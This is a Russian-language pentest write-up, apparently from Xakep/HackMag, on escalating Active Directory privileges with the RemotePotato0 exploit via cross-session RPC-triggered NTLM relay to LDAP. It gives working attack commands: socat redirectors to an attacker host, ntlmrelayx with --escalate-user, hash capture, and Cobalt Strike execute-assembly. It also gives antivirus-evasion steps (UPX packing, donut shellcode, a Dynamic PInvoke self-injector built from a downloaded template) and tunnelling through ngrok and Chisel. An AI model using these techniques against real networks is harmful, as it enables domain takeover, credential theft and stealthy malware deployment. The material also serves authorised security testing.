---
layout: post
title: "УдаленнаяКартошка0. Повышаем привилегии в AD через кросс-протокольную атаку NTLM Relay"
date: 2022-12-30 03:00:00 +0300
author: snovvcrash
tags: [xakep-ru, internal-pentest, active-directory, eop, pivoting, tunneling, ntlm-relay, dcom-rpc, potatoes, remotepotato0, cobalt-strike, impacket, ntlmrelayx]
---

[//]: # (2022-05-11)

Эта история относится к категории «байки с внутренних пентестов», когда мы попали в среду Active Directory, где члены группы безопасности Domain Users (все пользователи домена) обладали привилегией для удаленного подключения к контроллерам домена по протоколу RDP. Хоть это уже само по себе ужасная «мисконфига», потенциальный злоумышленник все еще должен найти способ для локального повышения привилегий на DC, что проблематично, если на системе стоят все хотфиксы. Здесь и приходит на помощью <strike>баг</strike> фича из серии Microsoft Won't Fix List – кросс-сессионное провоцирование вынужденной аутентификации по протоколу RPC – которая при отсуствии защиты службы LDAP от атак NTLM Relay мгновенно подарит тебе «ключи от Королевства». В этой статье мы поговорим о различных вариациях проведения данной атаки с использованием эксплоита RemotePotato0, а также на этом примере обсудим, как можно спрятать сигнатуру исполняемого файла от статического анализа.

<!--cut-->

<p align="right">
  <a href="https://hackmag.com/security/remotepotato0/"><img src="https://img.shields.io/badge/F-HackMag-26a0c4?style=flat-square" alt="hackmag-badge.svg" /></a>
  <a href="https://xakep.ru/2022/08/26/remotepotato0/"><img src="https://img.shields.io/badge/%5d%5b-%d0%a5%d0%b0%d0%ba%d0%b5%d1%80-red?style=flat-square" alt="xakep-badge.svg" /></a>
</p>

> **WARNING**
>
> Статья имеет ознакомительный характер и предназначена для специалистов по безопасности, проводящих тестирование в рамках контракта. Автор не несет ответственности за любой вред, причиненный с применением изложенной информации. Распространение вредоносных программ, нарушение работы систем и нарушение тайны переписки преследуются по закону.

[![banner.png](/assets/images/remote-potato-0/banner.png)](/assets/images/remote-potato-0/banner.png)
{:.center-image}

* TOC
{:toc}

# Предыстория

Итак, внутренний пентест. Все по классике: только я, мой ноутбук,<strike>капюшон с маской Гая Фокса,</strike> переговорка, скоммутированная розетка RJ-45 и просторы корпоративной сети жертвы аудита. Отсутствие правил фильтрации IPv6 в моем широковещательном домене – в роли уязвимости, отравленные пакеты DHCPv6 Advertise с link-local IPv6-адресом моего ноутбука ([mitm6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)) – в роли атаки, и вот получен первоначальный аутентифицированный доступ в среду AD. Далее сбор дампа «блада» с помощью [BloodHound.py](https://github.com/fox-it/BloodHound.py), пока все по классике. Но вот то, что было дальше, ПОВЕРГЛО ВСЕХ В ШОК (ПЕРЕЙДИ ПО ССЫЛКЕ ДЛЯ ПРОДОЛЖЕНИЯ)...

Шучу, всего лишь все доменные «пользаки» могут коннектиться к контроллерам домена по RDP, что может пойти не так?

[![Найди уязвимость на картинке](/assets/images/remote-potato-0/bloodhound.png)](/assets/images/remote-potato-0/bloodhound.png)
{:.center-image}

Найди уязвимость на картинке
{:.quote}

На самом деле, уже в этот момент можно начинать потирать руки в предвкушении кредов доменадмина. Убедимся, что мы можем релеить Net-NTLMv2 аутентификацию на службы LDAP(S) с помощью [LdapRelayScan](https://github.com/zyn3rgy/LdapRelayScan).

```
~$ python3 LdapRelayScan.py -method BOTH -dc-ip <REDACTED> -u <REDACTED> -p <REDACTED>
```

[![PARTY TIME!](/assets/images/remote-potato-0/ldaprelayscan.png)](/assets/images/remote-potato-0/ldaprelayscan.png)
{:.center-image}

PARTY TIME!
{:.quote}

Неудивительно, что [LDAP Signing](https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a) (защита LDAP, 389/TCP) и [LDAP Channel Binding](https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a) (защита LDAPS, 636/TCP) отключены – еще мало кто осознал, что это «мастхэв»-mitigations АД в наше время.

А теперь по порядку, что со всем этим можно сделать...

# Немного о «картошках»

## RottenPotato & Co.

В далеком 2016 г. умные люди придумали [RottenPotato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) – технику локального повышения привилегий с сервисных аккаунтов Windows (например, `IIS APPPOOL\DefaultAppPool` или `NT Service\MSSQL$SQLEXPRESS`), обладающих привилегей олицетворения чужих токенов безопасности (aka *SeImpersonatePrivilege*), до `NT AUTHORITY\SYSTEM`.

Для этого атакующий должен был:

1. Спровоцировать вынужденную аутентификацию со стороны `NT AUTHORITY\SYSTEM` на машине-жертве через триггер API-ручки DCOM/RPC `CoGetInstanceFromIStorage` в отношении локального слушателя (выступает в роли «человека посередине»).
2. Одновременно провести **локальную** атаку NTLM Relay на службу RPC (135/TCP) и дернуть API-вызов DCOM/RPC `AcceptSecurityContext`, передавая ему содержимое NTLM-части запроса Negotiate (NTLM Type 1) от `NT AUTHORITY\SYSTEM`.
3. Подменить NTLM-челлендж (NTLM Type 2), исходящий от службы RPC (135/TCP), на челлендж, полученный из ответа `AcceptSecurityContext`, и продолжить изначальный релей на RPC из шага 1. В данном контексте NTLM-ответ службы RPC (135/TCP) используется просто как шаблон сетевого ответа, в который мы инжектим нужное нам тело NTLM-челленджа.
4. После успешного получения NTLM-аутентификации (NTLM Type 3) клиента RPC из шага 1 в ответ на NTLM-челлендж (NTLM Type 2) из шага 3 зарелеить ее на RPC-ручку `AcceptSecurityContext` и получить токен системы. На этом NTLM Relay окончен.
5. Имперсонировать (олицетворить) `NT AUTHORITY\SYSTEM`. Мы можем это сделать в силу наличия у нас привилегии *SeImpersonatePrivilege*.

[![Механизм работы RottenPotato (изображение – jlajara.gitlab.io)](/assets/images/remote-potato-0/rottenpotato-scheme.png)](/assets/images/remote-potato-0/rottenpotato-scheme.png)
{:.center-image}

Механизм работы RottenPotato (изображение – jlajara.gitlab.io)
{:.quote}

Некоторое время спустя лавочку прикрыли, запретив DCOM/RPC общаться с локальными слушателями – никаких тебе больше МитМ-ов. Но «картошки» все равно претерпевали изменения: были напилены [LonelyPotato](https://github.com/decoder-it/lonelypotato) (неактуально) и [JuicyPotato](https://ohpe.it/juicy-potato/) – улучшенная версия RottenPotato, умеющая работать [с разными значениями](https://ohpe.it/juicy-potato/CLSID/) CLSID (Class ID, идентификатор COM-класса) для «арбузинга» других служб (помимо [BITS](https://docs.microsoft.com/ru-ru/windows/win32/bits/background-intelligent-transfer-service-portal), которую использовала оригинальная «картошка»), в которых реализован интерфейс [IMarshal](https://docs.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal) для триггера NTLM-аутентификации.

В данном случае процесс провоцирования NTLM-аутентификации в своей основе имеет схожей принцип с вредоносной десериализацией объектов, только здесь это называется «[анмаршалинг](https://ru.wikipedia.org/wiki/%D0%9C%D0%B0%D1%80%D1%88%D0%B0%D0%BB%D0%B8%D0%BD%D0%B3)» – процесс восстановления COM-объекта из последовательности бит после его передачи в целевой метод в качестве аргумента.

Атакующий создает вредоносный COM-объект класса `IStorage` и вызывает API `CoGetInstanceFromIStorage` с указанием **создать** объект класса с конкретным идентификатором CLSID и **инициализировать** его состоянием из маршализированного вредоносного объекта. Одно из полей маршализированного объекта содержит указатель на подконтрольный атакующему слушатель, на который автоматически приходит отстук с NTLM-аутентификацией в процессе анмаршалинга.

```cpp
public static void BootstrapComMarshal(int port)
{
    IStorage stg = ComUtils.CreateStorage();

    // Use a known local system service COM server, in this cast BITSv1
    Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");

    TestClass c = new TestClass(stg, String.Format("127.0.0.1[{0}]", port));

    MULTI_QI[] qis = new MULTI_QI[1];

    qis[0].pIID = ComUtils.IID_IUnknownPtr;
    qis[0].pItf = null;
    qis[0].hr = 0;

    CoGetInstanceFromIStorage(null, ref clsid,
        null, CLSCTX.CLSCTX_LOCAL_SERVER, c, 1, qis);
}
```

Подробнее о механизме триггера NTLM-аутентификации в ходе абьюза DCOM/RPC можно почитать в первом репорте на эту тему: https://bugs.chromium.org/p/project-zero/issues/detail?id=325.

## RoguePotato

С релизом [RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/) – эволюционировавшей версией JuicyPotato – был продемонстрирован альтернативный подход к олицетворению привилегированных системных токенов:

1. Злоумышленник поднимает кастомный сервис OXID (Object Exporter ID) Resolver **на локальном порту** атакуемой машины, отличном от 135/TCP. OXID-резолвер используется в Windows для разрешения идентификатора вызываемого интерфейса RPC (в нашем случае подконтрольного аттакеру) в его имя, т. е. в строку RPC-биндинга.
2. Злоумышленник говорит службе DCOM/RPC машины-жертвы постучаться **на удаленный IP-адрес** (контролируется атакующим) для резолва той самой OXID-записи. Это необходимо в силу того, что Microsoft запретили обращение к локальным OXID-резолверам, слушающим НЕ на порту 135/TCP.
3. На том самом **удаленном IP-адресе** злоумышленник поднимает `socat` (или любой другой TCP-редиректор) на порту 135/TCP и «зеркалит» пришедший OXID-запрос на атакуемую машину в порт, на котором слушает кастомный сервис OXID Resolver из шага 1. Последний резолвит предоставленный идентификатор в стрингу RPC-биндинга именнованного канала `ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]`.
4. Далее машина-жертва наконец-то делает вредоносный RPC-вызов (API-ручка `IRemUnkown2`) с подключением к подконтрольному атакующему пайпу из шага 3, что позволяет нам олицетворить подключившегося клиента с помощью `RpcImpersonateClient`, как это описал [@itm4n](https://twitter.com/itm4n) в судьбоносном ресерче [PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/).

[![Механизм работы RoguePotato (изображение – jlajara.gitlab.io)](/assets/images/remote-potato-0/roguepotato-scheme.png)](/assets/images/remote-potato-0/roguepotato-scheme.png)
{:.center-image}

Механизм работы RoguePotato (изображение – jlajara.gitlab.io)
{:.quote}

С базовой теорией закончили.

Хороший тамлайн с кратким описанием всех «картошек» можно найти в этой статье: https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html.

# RemotePotato0

## Введение

[RemotePotato0](https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/) – успешный результат попытки расширить область применения RoguePotato для проведения атак на доменные учетные записи.

Работает это дело примерно так же, как и RoguePotato, за исключением того, что теперь мы используем другие службы (с другими значениями CLSID) для триггера NTLM-аутентификации от имени пользователей, сессии которых существуют на атакуемой машине одновременно с нашей. Первоначальный вариант эксплоита работал только при условии действия атакующего из так называемого «нулевого сеанса».

Session 0 Isolation – концепция разделения сессий пользователей от сессий системных служб и неинтерактивных приложений. Начиная с Windows Vista, все пользователя, подключаясь на машину удаленно по протоколу RDP, проваливаются в свою сессию, откуда не могут взаимодействовать с процессами, запущенными в других сессиях, если не обладают правами локального администратора. Однако, если «пользюк» подключен через службу WinRM (Windows Remote Management, 5985-5986/TCP) или SSH, то он проваливается непосредственно в нулевой сеанс, т. к. сами вышеуказанные службы существуют именно там.

Наглядный пример: пользователь `TINYCORP\j.doe` в моей лабе не имеет прав локаладмина на сервере TEXAS, поэтому не может видеть запущенных от имени администратора процессов Google Chrome, будучи подключенным по RDP. Однако, если открыть диспетчер задач с правами администратора, эти процессы будут отображены.

[![Запуск диспетчера задач с разными правами](/assets/images/remote-potato-0/taskmgr-sessions.png)](/assets/images/remote-potato-0/taskmgr-sessions.png)
{:.center-image}

Запуск диспетчера задач с разными правами
{:.quote}

С другой стороны, если я включу этого пользователя в локальную группу **Remote Management Users** на этом сервере и подключусь к нему с помощью [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), я окажусь в контексте Session 0, по-прежнему не обладая правами локаладмина.

[![Внутри нулевого сеанса по WinRM](/assets/images/remote-potato-0/evil-winrm-session.png)](/assets/images/remote-potato-0/evil-winrm-session.png)
{:.center-image}

Внутри нулевого сеанса по WinRM
{:.quote}

Это не означает, что я теперь могу делать с процессами в других сессиях все, что захочу, однако открывает интересные возможности в контексте взаимодействия с ними через DCOM/RPC.

То есть в ситуации, когда у нас есть пользователь с правами подключения к серверам в контексте нулевого сеанса посредством WinRM и/или SSH (т. е. входящий в группу Remote Management Users), но не обладающий правами локального администратора (в противном случае [мы можем просто сдампить LSASS](https://habr.com/ru/company/angarasecurity/blog/661341/) для получения нужных кред), можно было использовать трюк с RemotePotato0 при условии существования на атакуемом сервере сессий привилегированных пользователей. По словам автора эксплоита в этом случае при триггере NTLM-аутентификации через определенный CLSID мы сможем угнать контекст сессии **с наименьшим значением ее идентификатора**:

> *"If we have a shell in Session 0, even as a low privileged user, and trigger these particular CLSIDs, we will obtain an NTLM authentication from the user who is interactively connected (if more than one user is interactively connected, we will get that of the user with lowest session id)"*, источник – https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/

Понятно, что при таком раскладе область применимости RemotePotato0 была не очень широкой, поэтому хайпа вокруг этого метода было немного.

Спустя некоторое время на всеобщую радость эксплоит [обновился](https://twitter.com/decoder_it/status/1419403714222301186) и стал поддерживать функционал **кросс-сессионного** триггера NTLM-аутентификации: это означает, что действуя даже в рамках сессии № 1 из RDP, мы можем дернуть привилегированный контекст администратора, также залогиненного в RDP, но в сессии № 2.

И вот это уже было прям пушкой!

## Как работает и когда использовать

Перед переходом к практике суммируем наши знания о RemotePotato0.

Условия применимости атаки, или чем нам нужно обладать:

1. Скомпрометированная доменная УЗ, имеющая привилегии подключения к удаленному серверу по протоколу RDP, где потенциально могут тусить привилегированные пользователи. На самом деле, это условие встречается практически везде, т. к. везде есть терминальники, куда время от времени заглядывают доменадмины.
2. Подконтрольный атакующему хост в интранете, имеющий сетевую связанность по порту 135/TCP с атакуемым сервером (от этого условия мы избавимся далее).
3. Незащищенный эндпоинт с доменной аутентификацией, куда можно релеить Net-NTLMv2 аутентификацию, прилетевшую на наш HTTP-сервер. Идеальный вариант – службы LDAP(S) или стандартное веб-приложение корпоратвного центра сертификации Microsoft AD CS.
4. Возможность исполнения эксплоита RemotePotato0 на атакуемом сервере в обход средств антивирусной защиты.

Как работает атака:

1. Действуя из сессии непривилегированного пользователя, подключенного по RDP к серверу, где есть сессия привилегированного (или любого другого интересующего нас) доменного пользователя, атакующий триггерит NTLM-аутентификацию от имени жертвы через анмаршалинг вредоносного объекта COM-класса `IStorage` посредством передачи его в качестве аргумента в API-ручку `CoGetInstanceFromIStorage`. В вредоносном объекте живет IP-адрес и порт подконтрольного атакующему сетевого узла, куда позже прилетит NTLM-аутентификация.
2. На своем сервере атакующий зеркалит трафло, пришедшее на 135/TCP порт, обратно на атакуемую машину в порт, где уже поднят фейковый OXID-резолвер, который отдает запросу DCOM нужный RPC-биндинг.
3. Частично повторяется шаг 4 из описания работы RoguePotato: вызов `IRemUnknown2::RemRelease` в отношении локального RPC-сервера, инкапсуляция RPC-запроса с NTLM-аутентификацией в HTTP и перенаправление его на наш HTTP-сервер. Последний уже поднят на машине атакующего в виде инстанса [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py).
4. Проведение кросс-протокольной атаки NTLM Relay на незащищенный эндпоинт с доменной аутентификацией. В этом случае атакующий может добавить подконтрольного ему доменного пользователя в привилегированные доменные группы безопасности, настроить ограниченное делегировании на основе ресурсов [RBCD Abuse](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) для критических доменных ресурсов или использовать любой другой поддерживаемый вектор атаки ntlmrelayx.py.

[![Механизм работы RemotePotato0 (изображение – www.sentinelone.com)](/assets/images/remote-potato-0/remotepotato0-scheme.png)](/assets/images/remote-potato-0/remotepotato0-scheme.png)
{:.center-image}

Механизм работы RemotePotato0 (изображение – www.sentinelone.com)
{:.quote}

Перейдем к практике.

## Сферические примеры в вакууме

Прежде чем говорить об уклонении от AV и других «улучшалках», посмотрим на атаку при отключенных средствах защиты, чтобы понимать, какого результата нам ожидать.

Я загружу свежий релиз [RemotePotato0](https://github.com/antonioCoco/RemotePotato0) и распакую его прямо на целевом сервере.

```
PS > curl https://github.com/antonioCoco/RemotePotato0/releases/download/1.2/RemotePotato0.zip -o RemotePotato0.zip
PS > Expand-Archive .\RemotePotato0.zip -DestinationPath .
PS > ls .\RemotePotato0*
PS > .\RemotePotato0.exe
```

[![Загрузка и распаковка RemotePotato0](/assets/images/remote-potato-0/remotepotato0-help.png)](/assets/images/remote-potato-0/remotepotato0-help.png)
{:.center-image}

Загрузка и распаковка RemotePotato0
{:.quote}

Как можно видеть из help-а, в нашем распоряжении несколько режимов атаки: можно либо отправить аутентификацию на relay-сервер для ее перенаправления на другой эндпоинт (режим 0, по умолчанию), либо получить значение хеша Net-NTLMv2 для его офлайн-перебора (режим 2). Режимы 1 и 3 предназначены для триггера NTLM-аутентификации вручную, без «картошки», поэтому нам это не очень интересно.

Для разминки сперва попробуем режим 2:

* `-m` – режим атаки,
* `-x` – IP-адрес TCP-редиректора, который отзеркалит OXID-резолв обратно на машину-жертву на порт, указанный в опции `-p` (если бы я использовал Windows Server 2012, можно было бы обойтись без этой опции, т. к. на нем нет фиксов по запрету резолва OXID-запросов через нестандартные порты),
* `-p` – порт фейкового локального OXID-резолвера, куда будет отзеркален OXID-запрос машиной атакующего,
* `-s` – номер сессии пользователя, которого мы хотим олицетворить.

```
~$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<VICTIM_IP>:9998
PS > .\RemotePotato0.exe -m 2 -x <ATTACKER_IP> -p 9998 -s <SESSION_ID>
```

[![Запуск RemotePotato0 в режиме сбора хешей](/assets/images/remote-potato-0/remotepotato0-hashes.png)](/assets/images/remote-potato-0/remotepotato0-hashes.png)
{:.center-image}

Запуск RemotePotato0 в режиме сбора хешей
{:.quote}

Как видим, мы успешно получили значение хеша Net-NTLMv2, который теперь можно спокойно брутить в офлайне (режим `5600` hashcat тебе в помощь). Это полноценная замена атаки [Internal Monologue](https://github.com/eladshamir/Internal-Monologue), не требующая к тому же прав локального администратора.

Теперь перейдем к релею на LDAP. Опции те же самые, только добавим флаг `-r`, задающий IP-адрес HTTP-сервера атакующего, который проведет NTLM Relay.

```
~$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<VICTIM_IP>:9998
~$ sudo ntlmrelayx.py -t ldap://<DC_IP> --no-smb-server --no-wcf-server --no-raw-server --escalate-user <PWNED_USER>
PS > .\RemotePotato0.exe -m 0 -r <ATTACKER_IP> -x <ATTACKER_IP> -p 9998 -s <SESSION_ID>
```

[![Запуск RemotePotato0 в режиме релея](/assets/images/remote-potato-0/remotepotato0-relay.png)](/assets/images/remote-potato-0/remotepotato0-relay.png)
{:.center-image}

Запуск RemotePotato0 в режиме релея
{:.quote}

Вжух, и одной командой мы энтЫрпрайз одмены.

# Боевая практика

Это все, конечно, здорово, но совсем не жизненно.

Усложним задачу: нужно провести ту же атаку при активном дефендере и не обладая вспомогательной машиной на Linux, на которой поднимается TCP-редиректор (допустим, мы проломили внешний периметр и оказались внутри корпоративной инфраструктуры с сессией Cobalt Strike).

## Уклоняемся от AV

Судя по моему опыту, большинство аверов детектят RemotePotato0.exe, основываясь исключительно на сигнатурном анализе:

```
rule SentinelOne_RemotePotato0_privesc {
    meta:
        author = "SentinelOne"
        description = "Detects RemotePotato0 binary"
        reference = "https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop"
        
    strings:
        $import1 = "CoGetInstanceFromIStorage"
        $istorage_clsid = "{00000306-0000-0000-c000-000000000046}" nocase wide ascii
        $meow_header = { 4d 45 4f 57 }
        $clsid1 = "{11111111-2222-3333-4444-555555555555}" nocase wide ascii
        $clsid2 = "{5167B42F-C111-47A1-ACC4-8EABE61B0B54}" nocase wide ascii
        
    condition:       
        (uint16(0) == 0x5A4D) and $import1 and $istorage_clsid and $meow_header and 1 of ($clsid*)
}
```

Есть несколько возможных решений этой проблемы:

1. Упаковать RemotePotato0.exe с помощью какого-нибудь архиватора/энкодера/шифратора.
2. Выдернуть шеллкод из исполняемого файла и внедрить его в процесс из памяти.

На самом деле, второй способ – это overkill, потому что против Windows Defender работает даже [упаковка UPX-ом](https://xakep.ru/2021/06/03/elf-upx-unpack/).

[![Defender Advanced (ага да) Evasion UPX-упаковкой](/assets/images/remote-potato-0/remotepotato0-upx.png)](/assets/images/remote-potato-0/remotepotato0-upx.png)
{:.center-image}

Defender Advanced (ага да) Evasion UPX-упаковкой
{:.quote}

Но мы можем лучше: второй способ не потребует даже загрузки исполняемого файла эксплоита на диск, поэтому реализуем это.

В одной из прошлых статей мы говорили о бесшумном внедрении шеллкода в память удаленных процессов с помощью механизма [D/Invoke](https://thewover.github.io/Dynamic-Invoke/): https://xakep.ru/2022/03/31/keethief/

Помимо D/Invoke существует еще один интересный способ обфускации вызовов Win32 API при трейдкрафте на C#. Он освещен в этой статье – [Unmanaged Code Execution with .NET Dynamic PInvoke](https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/).

Суть проста: в C# существует нативный механизм [System.Reflection.Emit](https://docs.microsoft.com/ru-ru/dotnet/api/system.reflection.emit?view=net-6.0), позволяющий «на лету» создавать сборки .NET и исполнять их с помощью механизма `Reflection.Assembly` из памяти прямо в рантайме. Используя этот механизм, мы можем так же «на лету» строить обертки для вызовов Win32 API, не прибегая к статическим декларациям [P/Invoke](http://www.pinvoke.net/).

Пример определения функции **CreateThread**, дергающей одноименную ручку API из `kernel32.dll`:

```csharp
class DPInvoke
{
    static object DynamicPInvokeBuilder(Type type, string library, string method, object[] parameters, Type[] parameterTypes)
    {
        AssemblyName assemblyName = new AssemblyName("Temp01");
        AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
        ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("Temp02");

        MethodBuilder methodBuilder = moduleBuilder.DefinePInvokeMethod(method, library, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, type, parameterTypes, CallingConvention.Winapi, CharSet.Ansi);

        methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
        moduleBuilder.CreateGlobalFunctions();

        MethodInfo dynamicMethod = moduleBuilder.GetMethod(method);
        object result = dynamicMethod.Invoke(null, parameters);

        return result;
    }

    public static IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
    {
        Type[] parameterTypes = { typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
        object[] parameters = { lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
        var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), "kernel32.dll", "CreateThread", parameters, parameterTypes);
        return result;
    }
}
```

На основе примеров из статьи выше я напилил [шаблон](https://gist.github.com/snovvcrash/30bd25b1a5a18d8bb7ce3bb8dc2bae37) для автоматизации создания self-инжекторов. Шеллкоды генерируются из PE-файлов с помощью [этого форка](https://github.com/S4ntiagoP/donut/tree/syscalls) проекта donut.

Для компиляции .NET потребуется машина с Visual Studio.

```
~$ wget -q https://github.com/antonioCoco/RemotePotato0/releases/download/1.2/RemotePotato0.zip
~$ unzip RemotePotato0.zip
~$ ./donut -i RemotePotato0.exe -b=1 -t -p '-m 2 -x <ATTACKER_IP> -p 9998 -s <SESSION_ID>' -o RemotePotato0.bin
PS > $binaryName = "RemotePotato0"
PS > $bytes = [System.IO.File]::ReadAllBytes("$(pwd)\${binaryName}.bin")
PS > [System.IO.MemoryStream] $outStream = New-Object System.IO.MemoryStream
PS > $dStream = New-Object System.IO.Compression.DeflateStream($outStream, [System.IO.Compression.CompressionLevel]::Optimal)
PS > $dStream.Write($bytes, 0, $bytes.Length)
PS > $dStream.Dispose()
PS > $outBytes = $outStream.ToArray()
PS > $outStream.Dispose()
PS > $b64Compressed = [System.Convert]::ToBase64String($outBytes)
PS > $template = (New-Object Net.WebClient).DownloadString("https://gist.github.com/snovvcrash/30bd25b1a5a18d8bb7ce3bb8dc2bae37/raw/881ec72c7c310bc07af017656a47d0c659fab4f6/template.cs") -creplace 'DONUT', $b64Compressed
PS > $template -creplace 'NAMESPACE', "${binaryName}Inject" > ${binaryName}Inject.cs
PS > csc /t:exe /platform:x64 /out:${binaryName}Inject.exe ${binaryName}Inject.cs
PS > rm ${binaryName}Inject.cs
```

[![Компиляция self-инжектора](/assets/images/remote-potato-0/remotepotato0-compile-injector.png)](/assets/images/remote-potato-0/remotepotato0-compile-injector.png)
{:.center-image}

Компиляция self-инжектора
{:.quote}

Протестим его в следующем разделе, когда решим проблему с TCP-редиректором.

## ngrok + socat = 💕

Допустим, мы получили «маячок» CS на уязвимом для атаки сервере, но у нас нет другого ресурса во внутренней сети жертвы, чтобы использовать его как зеркало для OXID-запросов.

Для имитации этой ситуации я врубил обратно дефендёр и воспользовался [своим волшебным инжектором](https://github.com/snovvcrash/DInjector) с позаимствованной у [@_RastaMouse](https://twitter.com/_RastaMouse) техникой [Module Stomping](https://offensivedefence.co.uk/posts/module-stomping/) и получил сессию «кобы».

[![Ничего подозрительного](/assets/images/remote-potato-0/cs-first-beacon-trigger.png)](/assets/images/remote-potato-0/cs-first-beacon-trigger.png)
{:.center-image}

Ничего подозрительного
{:.quote}

[![You've poped a shell!](/assets/images/remote-potato-0/cs-first-beacon-callback.png)](/assets/images/remote-potato-0/cs-first-beacon-callback.png)
{:.center-image}

You've poped a shell!
{:.quote}

Теперь немного pivoting-а: отсутствие вспомогательной машины я компенсирую тем, что подниму TCP-инстанс **ngrok**, который даст белый эндпоинт для общения с машиной атакующего (которая находится за пределами внутренней сети).

```
~$ ngrok tcp 136
```

[![ngrok слушает на 136/TCP](/assets/images/remote-potato-0/ngrok-tcp-136.png)](/assets/images/remote-potato-0/ngrok-tcp-136.png)
{:.center-image}

ngrok слушает на 136/TCP
{:.quote}

Так как мы не можем контролировать порт, который ngrok вешает на белый адрес (а нам нужен только 135/TCP), понадобится еще один редиректор, в роли которого выступит socat на моей VDS-ке (на атакуемом сервере должен быть доступ в Интернеты, чтобы до него достучаться).

```
~$ nslookup <NGROK_IP>
~$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<NGROK_IP>:<NGROK_PORT>
```

[![ngrok + socat на VDS](/assets/images/remote-potato-0/vds-ngrok-socat.png)](/assets/images/remote-potato-0/vds-ngrok-socat.png)
{:.center-image}

ngrok + socat на VDS
{:.quote}

Теперь я могу ловить трафик на 136/TCP на машине аттакера, прилетевший с ngrok, и перенаправлять его обратно на жертву. В этом мне поможет SOCKS-прокся, развернутая кобой.

Эмпирическим путем было установлено, что проксю лучше поднимать в отдельном биконе, т. к. изначальная сессия начинает тупить, когда мы делаем `execute-assembly` с нашим инжектором, который мы, кстати, так и не протестили – исправим это (теперь надо только перегенерить шеллкод с нужным IP VDS-ки в аргументе `-x`).

```
beacon(1)> socks 1080
~$ sudo proxychains4 -q socat -v TCP-LISTEN:136,fork,reuseaddr TCP:<VICTIM_INTERNAL_IP>:9998
beacon(2)> execute-assembly RemotePotato0Inject.exe
```

[![А вот и хешики!](/assets/images/remote-potato-0/cs-remotepotato0-hashes.png)](/assets/images/remote-potato-0/cs-remotepotato0-hashes.png)
{:.center-image}

А вот и хешики!
{:.quote}

[![Тем временем на VDS](/assets/images/remote-potato-0/vds-remotepotato0-hashes.png)](/assets/images/remote-potato-0/vds-remotepotato0-hashes.png)
{:.center-image}

Тем временем на VDS
{:.quote}

Но и это не предел наших возможностей – таким же способом можно зарелеить аутентификацию на LDAP. Для начала перегенерим шеллкод с нужными нам аргументами (изменим режим в `-m` и добавим адрес VDS в `-r`).

```
~$ ./donut -i RemotePotato0.exe -b=1 -t -p '-m 0 -r <VDS_IP> -x <VDS_IP> -p 9998 -s <SESSION_ID>' -o RemotePotato0.bin
```


К сожалению, в бесплатной версии ngrok-а не получится одновременно поднять второй канал, поэтому я воспользуюсь [Chisel](https://github.com/jpillora/chisel) для перенаправления HTTP-трафла. Откровенно говоря, можно было и первый редирект настроить через chisel, и не юзать ngrok вообще, но ладно.

Мы подробно рассматривали Chisel, когда решали одну из тачек на Hack The Box: https://xakep.ru/2020/02/17/htb-reddish/.

```
beacon(1)> socks 1080
(ATTACKER) ~$ ngrok tcp 136
(VDS) ~$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<NGROK_IP>:<NGROK_PORT>
(VDS) ~$ sudo ./chisel server -p 8000 --reverse --auth <USER>:<PASS>
(ATTACKER) ~$ ./chisel client --auth <USER>:<PASS> <VDS_IP>:8000 R:80:127.0.0.1:8080
(ATTACKER) ~$ sudo proxychains4 -q socat -v TCP-LISTEN:136,fork,reuseaddr TCP:<VICTIM_INTERNAL_IP>:9998
(ATTACKER) ~$ sudo proxychains4 -q ntlmrelayx.py -t ldap://<DC_INTERNAL_IP> --http-port 8080 --no-smb-server --no-wcf-server --no-raw-server --escalate-user <PWNED_USER>
beacon(2)> execute-assembly RemotePotato0Inject.exe
```

[![Релеим HTTP через Chisel](/assets/images/remote-potato-0/cs-remotepotato0-relay.png)](/assets/images/remote-potato-0/cs-remotepotato0-relay.png)
{:.center-image}

Релеим HTTP через Chisel
{:.quote}

[![Тем временем на VDS (дубль 2)](/assets/images/remote-potato-0/vds-remotepotato0-relay.png)](/assets/images/remote-potato-0/vds-remotepotato0-relay.png)
{:.center-image}

Тем временем на VDS (дубль 2)
{:.quote}

